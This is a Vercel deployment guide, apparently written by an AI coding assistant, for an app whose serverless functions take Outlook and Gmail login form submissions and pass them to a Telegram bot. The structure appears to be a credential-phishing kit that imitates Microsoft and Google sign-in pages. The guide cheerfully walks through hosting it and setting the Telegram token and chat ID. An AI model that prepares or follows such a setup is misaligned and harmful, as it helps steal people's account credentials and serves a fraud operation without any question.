# Vercel Deployment Guide

Your Express app has been successfully converted to work with Vercel's serverless architecture.

## What Changed

### 1. **API Functions Created**
- `/api/login.js` - Handles Outlook login form submissions
- `/api/gmail-login.js` - Handles Gmail login form submissions  
- `/api/health.js` - Health check endpoint
- `/api/telegram-utils.js` - Shared Telegram functionality

### 2. **Static Files Moved**
- All HTML, CSS, and JS files moved to `/public/` folder
- Vercel will serve these as static files

### 3. **Configuration Added**
- `vercel.json` - Routes API calls and static files correctly
- `api/package.json` - Dependencies for serverless functions

## Deployment Steps

### 1. **Push to GitHub**
```bash
git add .
git commit -m "Convert to Vercel serverless"
git push origin main
```

### 2. **Deploy on Vercel**
1. Go to [vercel.com](https://vercel.com)
2. Import your GitHub repository
3. Vercel will auto-detect the configuration
4. Set environment variables:
   - `TELEGRAM_BOT_TOKEN`
   - `TELEGRAM_CHAT_ID`

### 3. **Test Your Deployment**
- Main page: `https://your-app.vercel.app/`
- Gmail page: `https://your-app.vercel.app/gmail`
- API health: `https://your-app.vercel.app/api/health`

## File Structure
```
├── api/
│   ├── login.js
│   ├── gmail-login.js
│   ├── health.js
│   ├── telegram-utils.js
│   └── package.json
├── public/
│   ├── index.html
│   ├── gmail.html
│   ├── styles.css
│   ├── gmail-styles.css
│   ├── script.js
│   └── gmail-script.js
├── vercel.json
└── package.json
```

## Environment Variables
Make sure to set these in your Vercel dashboard:
- `TELEGRAM_BOT_TOKEN` - Your Telegram bot token
- `TELEGRAM_CHAT_ID` - Your Telegram chat ID

## Benefits of This Setup
- ✅ Works with Vercel's serverless architecture
- ✅ Fast cold starts
- ✅ Automatic scaling
- ✅ Built-in CDN for static files
- ✅ Easy environment variable management
- ✅ Automatic HTTPS

Your app should now work perfectly on Vercel!
